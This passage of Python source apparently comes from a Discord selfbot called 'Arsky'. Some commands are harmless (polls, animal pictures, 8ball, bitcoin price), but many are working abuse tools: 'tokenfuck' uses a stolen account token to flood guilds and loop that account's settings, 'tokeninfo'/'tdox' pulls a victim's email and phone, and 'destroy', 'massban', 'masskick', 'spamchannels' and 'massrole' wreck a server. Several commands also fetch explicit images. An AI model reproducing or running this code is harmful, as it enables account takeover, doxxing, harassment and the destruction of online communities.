  @Arsky.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
  async def wyr(ctx):  # b'\xfc'
      await ctx.message.delete()
      r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
      soup = bs4(r, 'html.parser')
      qa = soup.find(id='qa').text
      qb = soup.find(id='qb').text
      message = await ctx.send(f"{qa}\nor\n{qb}")
      await message.add_reaction("🅰")
      await message.add_reaction("🅱")


  @Arsky.command()
  async def topic(ctx):  # b'\xfc'
      await ctx.message.delete()
      r = requests.get('https://www.conversationstarters.com/generator.php').content
      soup = bs4(r, 'html.parser')
      topic = soup.find(id="random").text
      await ctx.send(topic)


  @Arsky.command(aliases=['dong', 'penis'])
  async def dick(ctx, *, user: discord.Member = None):
      await ctx.message.delete()
      if user is None:
          user = ctx.author
      size = random.randint(1, 15)
      dong = ""
      for _i in range(0, size):
          dong += "="
      await ctx.send(f"{user}'s Dick size\n8{dong}D")


  @Arsky.command(aliases=['changehypesquad'])
  async def hypesquad(ctx, house):
      await ctx.message.delete()
      request = requests.Session()
      headers = {
          'Authorization': token,
          'Content-Type': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
      }
      if house == "bravery":
          payload = {'house_id': 1}
      elif house == "brilliance":
          payload = {'house_id': 2}
      elif house == "balance":
          payload = {'house_id': 3}
      elif house == "random":
          houses = [1, 2, 3]
          payload = {'house_id': random.choice(houses)}
      try:
          request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
      except Exception as e:
          print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


  @Arsky.command(aliases=['tokenfucker', 'disable', 'crash'])
  async def tokenfuck(ctx, _token):
      await ctx.message.delete()
      headers = {
          'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
          'Content-Type': 'application/json',
          'Authorization': _token,
      }
      request = requests.Session()
      payload = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          'status': "invisible"
      }
      guild = {
          'channels': None,
          'icon': None,
          'name': "Exeter",
          'region': "europe"
      }
      for _i in range(50):
          requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
      while True:
          try:
              request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
          except Exception as e:
              print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
          else:
              break
      modes = cycle(["light", "dark"])
      statuses = cycle(["online", "idle", "dnd", "invisible"])
      while True:
          setting = {
              'theme': next(modes),
              'locale': random.choice(locales),
              'status': next(statuses)
          }
          while True:
              try:
                  request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                                timeout=10)
              except Exception as e:
                  print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
              else:
                  break


  @Arsky.command(aliases=['fakeconnection', 'spoofconnection', 'spoofcon', "fakecon"])
  async def fakenet(ctx, _type=None, *, name=None):
      await ctx.message.delete()
      if _type is None or name is None:
          await ctx.send("missing parameters")
          return
      ID = random.randrange(10000000, 90000000)
      avaliable = [
          'battlenet',
          'skype',
          'lol']
      payload = {
          'name': name,
          'visibility': 1
      }
      token = config.get('token')
      headers = {
          'Authorization': token,
          'Content-Type': 'application/json',
      }

      if name is None:
          name = 'about:blank'
      elif _type not in avaliable:
          await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after=3)
          return
      r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}',
                      data=json.dumps(payload), headers=headers)
      if r.status_code == 200:
          await ctx.send(f"Invalid connection_type: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
      else:
          await ctx.send(
              '**[ERROR]** `Exeter Fake-Connection doesn\'t work anymore because Discord patched connection-spoofing`')


  @Arsky.command(aliases=['tokinfo', 'tdox'])
  async def tokeninfo(ctx, _token):
      await ctx.message.delete()
      headers = {
          'Authorization': _token,
          'Content-Type': 'application/json'
      }
      try:
          res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
          res = res.json()
          user_id = res['id']
          locale = res['locale']
          avatar_id = res['avatar']
          language = languages.get(locale)
          creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
              '%d-%m-%Y %H:%M:%S UTC')
      except KeyError:
          headers = {
              'Authorization': "Bot " + _token,
              'Content-Type': 'application/json'
          }
          try:
              res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
              res = res.json()
              user_id = res['id']
              locale = res['locale']
              avatar_id = res['avatar']
              language = languages.get(locale)
              creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                  '%d-%m-%Y %H:%M:%S UTC')
              em = discord.Embed(
                  description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
              fields = [
                  {'name': 'Flags', 'value': res['flags']},
                  {'name': 'Local language', 'value': res['locale'] + f"{language}"},
                  {'name': 'Verified', 'value': res['verified']},
              ]
              for field in fields:
                  if field['value']:
                      em.add_field(name=field['name'], value=field['value'], inline=False)
                      em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
              return await ctx.send(embed=em)
          except KeyError:
              await ctx.send("Invalid token")
      em = discord.Embed(
          description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
      nitro_type = "None"
      if "premium_type" in res:
          if res['premium_type'] == 2:
              nitro_type = "Nitro Premium"
          elif res['premium_type'] == 1:
              nitro_type = "Nitro Classic"
      fields = [
          {'name': 'Phone', 'value': res['phone']},
          {'name': 'Flags', 'value': res['flags']},
          {'name': 'Local language', 'value': res['locale'] + f"{language}"},
          {'name': 'MFA', 'value': res['mfa_enabled']},
          {'name': 'Verified', 'value': res['verified']},
          {'name': 'Nitro', 'value': nitro_type},
      ]
      for field in fields:
          if field['value']:
              em.add_field(name=field['name'], value=field['value'], inline=False)
              em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
      return await ctx.send(embed=em)


  @Arsky.command(aliases=["copyguild", "copyserver"])
  async def copy(ctx):  # b'\xfc'
      await ctx.message.delete()
      await Arsky.create_guild(f'backup-{ctx.guild.name}')
      await asyncio.sleep(4)
      for g in Arsky.guilds:
          if f'backup-{ctx.guild.name}' in g.name:
              for c in g.channels:
                  await c.delete()
              for cate in ctx.guild.categories:
                  x = await g.create_category(f"{cate.name}")
                  for chann in cate.channels:
                      if isinstance(chann, discord.VoiceChannel):
                          await x.create_voice_channel(f"{chann}")
                      if isinstance(chann, discord.TextChannel):
                          await x.create_text_channel(f"{chann}")
      try:
          await g.edit(icon=ctx.guild.icon_url)
      except:
          pass


  @Arsky.command()
  async def poll(ctx, *, arguments):
      await ctx.message.delete()
      message = discord.utils.escape_markdown(arguments[str.find(arguments, "msg:"):str.find(arguments, "1:")]).replace(
          "msg:", "")
      option1 = discord.utils.escape_markdown(arguments[str.find(arguments, "1:"):str.find(arguments, "2:")]).replace(
          "1:", "")
      option2 = discord.utils.escape_markdown(arguments[str.find(arguments, "2:"):]).replace("2:", "")
      message = await ctx.send(f'`Poll: {message}\nOption 1: {option1}\nOption 2: {option2}`')
      await message.add_reaction('🅰')
      await message.add_reaction('🅱')


  @Arsky.command()
  async def massmention(ctx, *, message=None):
      await ctx.message.delete()
      if len(list(ctx.guild.members)) >= 50:
          userList = list(ctx.guild.members)
          random.shuffle(userList)
          sampling = random.choices(userList, k=50)
          if message is None:
              post_message = ""
              for user in sampling:
                  post_message += user.mention
              await ctx.send(post_message)
          else:
              post_message = message + "\n\n"
              for user in sampling:
                  post_message += user.mention
              await ctx.send(post_message)
      else:
          if message is None:
              post_message = ""
              for user in list(ctx.guild.members):
                  post_message += user.mention
              await ctx.send(post_message)
          else:
              post_message = message + "\n\n"
              for user in list(ctx.guild.members):
                  post_message += user.mention
              await ctx.send(post_message)


  @Arsky.command(aliases=["rekt", "nuke"])
  async def destroy(ctx):
      await ctx.message.delete()
      for user in list(ctx.guild.members):
          try:
              await user.ban()
          except:
              pass
      for channel in list(ctx.guild.channels):
          try:
              await channel.delete()
          except:
              pass
      for role in list(ctx.guild.roles):
          try:
              await role.delete()
          except:
              pass
      try:
          await ctx.guild.edit(
              name=RandString(),
              description="Arsky LOL",
              reason="Arsky LOL",
              icon=None,
              banner=None
          )
      except:
          pass
      for _i in range(250):
          await ctx.guild.create_text_channel(name="Arsky")
      for _i in range(250):
          await ctx.guild.create_role(name="Arsky", color=RandomColor())


  @Arsky.command(aliases=["banwave", "banall", "etb"])
  async def massban(ctx):
      await ctx.message.delete()
      users = list(ctx.guild.members)
      for user in users:
          try:
              await user.ban(reason="Arsky")
          except:
              pass


  @Arsky.command()
  async def dynoban(ctx):
      await ctx.message.delete()
      for member in list(ctx.guild.members):
          message = await ctx.send("?ban " + member.mention)
          await message.delete()
          await asyncio.sleep(1.5)


  @Arsky.command(aliases=["kickall", "kickwave"])
  async def masskick(ctx):
      await ctx.message.delete()
      users = list(ctx.guild.members)
      for user in users:
          try:
              await user.kick(reason="Arsky")
          except:
              pass


  @Arsky.command(aliases=["spamroles"])
  async def massrole(ctx):
      await ctx.message.delete()
      for _i in range(250):
          try:
              await ctx.guild.create_role(name="Arsky", color=RandomColor())
          except:
              return


  @Arsky.command(aliases=["masschannels", "masschannel", "ctc"])
  async def spamchannels(ctx):
      await ctx.message.delete()
      for _i in range(250):
          try:
              await ctx.guild.create_text_channel(name="Arsky")
          except:
              return


  @Arsky.command(aliases=["delchannel"])
  async def delchannels(ctx):
      await ctx.message.delete()
      for channel in list(ctx.guild.channels):
          try:
              await channel.delete()
          except:
              return


  @Arsky.command(aliases=["deleteroles"])
  async def delroles(ctx):
      await ctx.message.delete()
      for role in list(ctx.guild.roles):
          try:
              await role.delete()
          except:
              pass


  @Arsky.command(aliases=["purgebans", "unbanall"])
  async def massunban(ctx):
      await ctx.message.delete()
      banlist = await ctx.guild.bans()
      for users in banlist:
          try:
              await asyncio.sleep(2)
              await ctx.guild.unban(user=users.user)
          except:
              pass


  @Arsky.command()
  async def spam(ctx, amount: int, *, message):
      await ctx.message.delete()
      for _i in range(amount):
          await ctx.send(message)


  @Arsky.command()
  async def dm(ctx, user: discord.Member, *, message):
      await ctx.message.delete()
      user = Exeter.get_user(user.id)
      if ctx.author.id == Exeter.user.id:
          return
      else:
          try:
              await user.send(message)
          except:
              pass


  @Arsky.command(name='get-color', aliases=['color', 'colour', 'sc', "hexcolor", "rgb"])
  async def _get_color(ctx, *, color: discord.Colour):
      await ctx.message.delete()
      file = io.BytesIO()
      Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
      file.seek(0)
      em = discord.Embed(color=color, title=f'{str(color)}')
      em.set_image(url='attachment://color.png')
      await ctx.send(file=discord.File(file, 'color.png'), embed=em)


  @Arsky.command(aliases=['rainbowrole'])
  async def rainbow(ctx, *, role):
      await ctx.message.delete()
      role = discord.utils.get(ctx.guild.roles, name=role)
      while True:
          try:
              await role.edit(role=role, colour=RandomColor())
              await asyncio.sleep(10)
          except:
              break


  @Arsky.command()
  async def ping(ctx):
      await ctx.message.delete()
      before = time.monotonic()
      message = await ctx.send("Pinging...")
      ping = (time.monotonic() - before) * 1000
      await message.edit(content=f"`{int(ping)} ms`")


  @Arsky.command(aliases=["guildinfo"])
  async def serverinfo(ctx):
      await ctx.message.delete()
      date_format = "%a, %d %b %Y %I:%M %p"
      embed = discord.Embed(title=f"{ctx.guild.name}",
                            description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                            timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
      embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
      embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
      embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
      embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
      embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
      await ctx.send(embed=embed)


  @Arsky.command()
  async def wizz(ctx):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.TextChannel):
          print("hi")
          initial = random.randrange(0, 60)
          message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
      elif isinstance(ctx.message.channel, discord.DMChannel):
          initial = random.randrange(1, 60)
          message = await ctx.send(
              f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
      elif isinstance(ctx.message.channel, discord.GroupChannel):
          initial = random.randrange(1, 60)
          message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
          await asyncio.sleep(1)
          await message.edit(
              content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")


  @Arsky.command(name='8ball')
  async def _ball(ctx, *, question):
      await ctx.message.delete()
      responses = [
          'That is a resounding no',
          'It is not looking likely',
          'Too hard to tell',
          'It is quite possible',
          'That is a definite yes!',
          'Maybe',
          'There is a good chance'
      ]
      answer = random.choice(responses)
      embed = discord.Embed()
      embed.add_field(name="Question", value=question, inline=False)
      embed.add_field(name="Answer", value=answer, inline=False)
      embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
      await ctx.send(embed=embed)


  @Arsky.command(aliases=['slots', 'bet', "slotmachine"])
  async def slot(ctx):
      await ctx.message.delete()
      emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
      a = random.choice(emojis)
      b = random.choice(emojis)
      c = random.choice(emojis)
      slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
      if a == b == c:
          await ctx.send(embed=discord.Embed.from_dict(
              {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
      elif (a == b) or (a == c) or (b == c):
          await ctx.send(embed=discord.Embed.from_dict(
              {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
      else:
          await ctx.send(embed=discord.Embed.from_dict(
              {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


  @Arsky.command()
  async def tts(ctx, *, message):
      await ctx.message.delete()
      buff = await do_tts(message)
      await ctx.send(file=discord.File(buff, f"{message}.wav"))


  @Arsky.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
  async def guildicon(ctx):
      await ctx.message.delete()
      em = discord.Embed(title=ctx.guild.name)
      em.set_image(url=ctx.guild.icon_url)
      await ctx.send(embed=em)


  @Arsky.command(aliases=['serverbanner'])
  async def banner(ctx):
      await ctx.message.delete()
      em = discord.Embed(title=ctx.guild.name)
      em.set_image(url=ctx.guild.banner_url)
      await ctx.send(embed=em)


  @Arsky.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
  async def _first_message(ctx, channel: discord.TextChannel = None):
      await ctx.message.delete()
      if channel is None:
          channel = ctx.channel
      first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
      embed = discord.Embed(description=first_message.content)
      embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
      await ctx.send(embed=embed)


  @Arsky.command(aliases=["rc"])
  async def renamechannels(ctx, *, name):
      await ctx.message.delete()
      for channel in ctx.guild.channels:
          await channel.edit(name=name)


  @Arsky.command(aliases=["renameserver", "nameserver"])
  async def servername(ctx, *, name):
      await ctx.message.delete()
      await ctx.guild.edit(name=name)


  @Arsky.command()
  async def nickall(ctx, nickname):
      await ctx.message.delete()
      for user in list(ctx.guild.members):
          try:
              await user.edit(nick=nickname)
          except:
              pass


  @Arsky.command()
  async def youtube(ctx, *, search):
      await ctx.message.delete()
      query_string = parse.urlencode({'search_query': search})
      html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
      search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
      await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])


  @Arsky.command()
  async def prefix(ctx, prefix):
      await ctx.message.delete()
      Arsky.command_prefix = str(prefix)


  @Arsky.command()
  async def abc(ctx):
      await ctx.message.delete()
      ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z']
      message = await ctx.send(ABC[0])
      await asyncio.sleep(2)
      for _next in ABC[1:]:
          await message.edit(content=_next)
          await asyncio.sleep(2)


  @Arsky.command(aliases=["100"])
  async def _100(ctx):
      await ctx.message.delete()
      message = ctx.send("Starting count to 100")
      await asyncio.sleep(2)
      for _ in range(100):
          await message.edit(content=_)
          await asyncio.sleep(2)


  @Arsky.command(aliases=['bitcoin'])
  async def btc(ctx):
      await ctx.message.delete()
      r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
      r = r.json()
      usd = r['USD']
      eur = r['EUR']
      em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
      em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
      await ctx.send(embed=em)


  @Arsky.command()
  async def hastebin(ctx, *, message):
      await ctx.message.delete()
      r = requests.post("https://hastebin.com/documents", data=message).json()
      await ctx.send(f"<https://hastebin.com/{r['key']}>")


  @Arsky.command(aliases=["fancy"])
  async def ascii(ctx, *, text):
      await ctx.message.delete()
      r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
      if len('```' + r + '```') > 2000:
          return
      await ctx.send(f"```{r}```")


  @Arsky.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
  async def cyclenick(ctx, *, text):
      await ctx.message.delete()
      global cycling
      cycling = True
      while cycling:
          name = ""
          for letter in text:
              name = name + letter
              await ctx.message.author.edit(nick=name)


  @Arsky.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
  async def stopcyclenick(ctx):
      await ctx.message.delete()
      global cycling
      cycling = False


  @Arsky.command()
  async def acceptfriends(ctx):
      await ctx.message.delete()
      for relationship in Exeter.user.relationships:
          if relationship == discord.RelationshipType.incoming_request:
              await relationship.accept()


  @Arsky.command()
  async def ignorefriends(ctx):
      await ctx.message.delete()
      for relationship in Exeter.user.relationships:
          if relationship is discord.RelationshipType.incoming_request:
              relationship.delete()


  @Arsky.command()
  async def delfriends(ctx):
      await ctx.message.delete()
      for relationship in Exeter.user.relationships:
          if relationship is discord.RelationshipType.friend:
              await relationship.delete()





  @Arsky.command()
  async def clearblocked(ctx):
      await ctx.message.delete()
      print(Arsky.user.relationships)
      for relationship in Arsky.user.relationships:
          if relationship is discord.RelationshipType.blocked:
              print(relationship)
              await relationship.delete()


  @Arsky.command(aliases=["changeregions", "changeregion", "regionschange"])
  async def regionchange(ctx, amount):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.GroupChannel):
          print()


  @Arsky.command()
  async def kickgc(ctx):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.GroupChannel):
          for recipient in ctx.message.channel.recipients:
              await ctx.message.channel.remove_recipients(recipient)


  @Arsky.command(aliases=["gcleave"])
  async def leavegc(ctx):
      await ctx.message.delete()
      if isinstance(ctx.message.channel, discord.GroupChannel):
          await ctx.message.channel.leave()


  @Arsky.command()
  async def massreact(ctx, emote):
      await ctx.message.delete()
      messages = await ctx.message.channel.history(limit=20).flatten()
      for message in messages:
          await message.add_reaction(emote)


  @Arsky.command()
  async def dog(ctx):
      await ctx.message.delete()
      r = requests.get("https://dog.ceo/api/breeds/image/random").json()
      link = str(r['message'])
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(link) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_dog.png"))
      except:
          await ctx.send(link)


  @Arsky.command()
  async def cat(ctx):
      await ctx.message.delete()
      r = requests.get("https://api.thecatapi.com/v1/images/search").json()
      link = str(r[0]["url"])
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(link) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_cat.png"))
      except:
          await ctx.send(link)


  @Arsky.command()
  async def sadcat(ctx):
      await ctx.message.delete()
      r = requests.get("https://api.alexflipnote.dev/sadcat").json()
      link = str(r['file'])
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(link) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_sadcat.png"))
      except:
          await ctx.send(link)


  @Arsky.command()
  async def bird(ctx):
      await ctx.message.delete()
      r = requests.get("https://api.alexflipnote.dev/birb").json()
      link = str(r['file'])
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(link) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_bird.png"))
      except:
          await ctx.send(link)


  @Arsky.command()
  async def fox(ctx):
      await ctx.message.delete()
      r = requests.get('https://randomfox.ca/floof/').json()
      link = str(r["image"])
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(link) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_fox.png"))
      except:
          await ctx.send(link)


  @Arsky.command()
  async def anal(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/anal")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_anal.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def erofeet(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/erofeet")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_erofeet.png"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def feet(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/feetg")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_feet.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def hentai(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_hentai.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def boobs(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/boobs")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_boobs.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)



  @Arsky.event
  async def on_connect():
    print("uwu")

  @Arsky.command()
  async def tits(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/tits")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_tits.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command()
  async def blowjob(ctx):
      await ctx.message.delete()
      r = requests.get("https://nekos.life/api/v2/img/blowjob")
      res = r.json()
      try:
          async with aiohttp.ClientSession() as session:
              async with session.get(res['url']) as resp:
                  image = await resp.read()
          with io.BytesIO(image) as file:
              await ctx.send(file=discord.File(file, f"exeter_blowjob.gif"))
      except:
          em = discord.Embed()
          em.set_image(url=res['url'])
          await ctx.send(embed=em)


  @Arsky.command(aliases=["neko"])
